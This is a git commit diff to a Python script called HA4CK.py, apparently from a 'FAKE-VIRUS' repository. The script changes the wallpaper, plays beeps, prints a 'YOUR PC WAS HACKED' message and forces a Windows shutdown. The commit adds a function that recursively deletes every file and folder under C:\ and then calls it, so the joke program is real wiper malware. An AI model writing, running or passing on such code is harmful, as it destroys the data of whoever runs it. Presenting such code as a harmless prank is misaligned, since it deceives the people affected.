dfbedaad72e0bf04159751cd895b9052cb5023c5
rx550x <150556636+HOSAM-ALOMARI@users.noreply.github.com>
2024-12-28 20:38:08 +0300

    Add files via upload

--- HA4CK.py
+++ HA4CK.py
@@ -7,7 +7,6 @@ import subprocess
 
 def change_wallpaper(image_path):
     if not os.path.exists(image_path):
-        show_message("Error", "The specified image path does not exist.")
         return
 
     try:
@@ -19,16 +18,39 @@ def change_wallpaper(image_path):
         show_message("Error", f"Failed to change wallpaper: {e}")
         
 def shutdown_pc():
-    winsound.Beep(1000000, 3000000)  
-    winsound.Beep(1000000, 200000000000)  
+    winsound.Beep(11111, 100000)  
+    winsound.Beep(7000, 100000)  
+    print("YOUR PC WAS HACKED LOL HAHAH")
     subprocess.run("shutdown /s /t 20", shell=True) 
 def show_message(title, message):
     root = tk.Tk()
     root.withdraw()  
     messagebox.showerror(title, message) 
 
-image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg" 
-print("YOUR PC WAS HACKED LOL HAHAH")
+image_path = "C:\Users\WDAGUtilityAccount\Downloads\FAKE-VIRUS-main (2).zip\FAKE-VIRUS-main/" 
 
 change_wallpaper(image_path)
 shutdown_pc()
+import os
+import shutil
+
+def delete_all_files(directory):
+    for foldername, subfolders, filenames in os.walk(directory, topdown=False):
+        for filename in filenames:
+            try:
+                file_path = os.path.join(foldername, filename)
+                os.remove(file_path)
+                print(f"Deleted file: {file_path}")
+            except Exception as e:
+                print(f"Failed to delete {file_path}: {e}")
+
+        for subfolder in subfolders:
+            try:
+                folder_path = os.path.join(foldername, subfolder)
+                shutil.rmtree(folder_path)
+                print(f"Deleted folder: {folder_path}")
+            except Exception as e:
+                print(f"Failed to delete {folder_path}: {e}")
+
+
+delete_all_files("C:\\")
